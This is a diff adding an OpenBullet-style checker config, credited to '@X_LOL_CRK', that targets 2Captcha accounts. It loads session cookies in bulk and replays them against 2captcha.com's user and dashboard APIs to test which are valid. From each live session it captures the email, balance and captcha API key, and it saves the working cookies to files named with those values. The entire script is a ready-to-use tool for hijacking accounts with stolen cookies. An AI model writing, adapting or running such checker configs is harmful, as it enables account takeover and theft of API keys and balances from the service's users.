@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "2Captcha Cookies",
+  "Type": 1,
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2024-01-28T20:29:10.302985+02:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@X_LOL_CRK",
+  "Version": "1.3.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+COOKIECONTAINER "2captcha" "<COOKIEPATH>" -> SAVE "X" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<X>" Contains "a" 
+  KEYCHAIN Failure OR 
+    KEY "<X>" DoesNotContain "a" 
+
+#CHECK REQUEST PUT "https://2captcha.com/api/v2/user" 
+  CONTENT "{\"profile\":{\"userType\":\"customer\"}}" 
+  CONTENTTYPE "application/json" 
+  COOKIE "<X>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "isBanned\":false" 
+  KEYCHAIN Failure OR 
+    KEY "Missing Authorization" 
+    KEY "<RESPONSECODE>" Contains "401" 
+
+#Balance PARSE "<SOURCE>" LR "amount\":" ",\"" CreateEmpty=FALSE -> CAP "Balance" 
+
+#Email PARSE "<SOURCE>" LR "email\":{\"address\":\"" "\"" CreateEmpty=FALSE -> CAP "Email" 
+
+#GET REQUEST GET "https://2captcha.com/api/v2/dashboard" 
+  
+  COOKIE "<X>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Api_Key PARSE "<SOURCE>" LR "apiKey\":\"" "\"" CreateEmpty=FALSE -> CAP "Captcha Key" 
+
+#Save UTILITY File "Cookies/2Captcha/2Captcha[<Email>][<Balance>][<Captcha Key>].txt" AppendLines "<COOKIENETSCAPE>" 
+
